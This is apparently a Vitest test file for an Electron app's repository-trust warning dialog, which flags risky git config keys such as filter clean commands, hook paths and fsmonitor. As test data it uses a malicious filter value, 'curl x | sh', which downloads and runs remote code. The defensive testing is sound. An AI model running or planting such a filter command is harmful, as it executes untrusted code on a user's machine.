import { describe, expect, test, vi } from 'vitest'

vi.mock('electron', () => ({ BrowserWindow: { getAllWindows: () => [] }, dialog: {} }))
vi.mock('../ipc/services', () => ({ runner: {} }))

import { repoTrustDialogOptions } from '../ipc/repoTrust'

describe('repoTrustDialogOptions', () => {
  test('Cancel is the default and the Esc answer; Open anyway is index 1', () => {
    const o = repoTrustDialogOptions('/p', [{ key: 'filter.x.clean', value: 'pwn' }])
    expect(o.type).toBe('warning')
    expect(o.buttons).toEqual(['Cancel', 'Open anyway'])
    expect(o.defaultId).toBe(0)
    expect(o.cancelId).toBe(0)
  })

  test('lists every risky key with its value and names the folder', () => {
    const o = repoTrustDialogOptions('/papers/template', [
      { key: 'filter.evil.clean', value: 'curl x | sh' },
      { key: 'core.hookspath', value: '.githooks' },
      { key: 'core.fsmonitor', value: '' },
    ])
    expect(o.detail).toContain('/papers/template')
    expect(o.detail).toContain('• filter.evil.clean = curl x | sh')
    expect(o.detail).toContain('• core.hookspath = .githooks')
    expect(o.detail).toContain('• core.fsmonitor\n')
  })

  test('bounds hostile values: newlines folded, long values truncated, long lists capped', () => {
    const long = 'a'.repeat(500)
    const risks = Array.from({ length: 15 }, (_, i) => ({ key: `filter.f${i}.clean`, value: i === 0 ? `x\ny ${long}` : 'z' }))
    const o = repoTrustDialogOptions('/p', risks)
    expect(o.detail).toContain('• filter.f0.clean = x y aaa')
    expect(o.detail).not.toContain(long)
    expect(o.detail).toContain('…and 3 more')
    expect(o.detail).not.toContain('filter.f12.clean')
  })
})
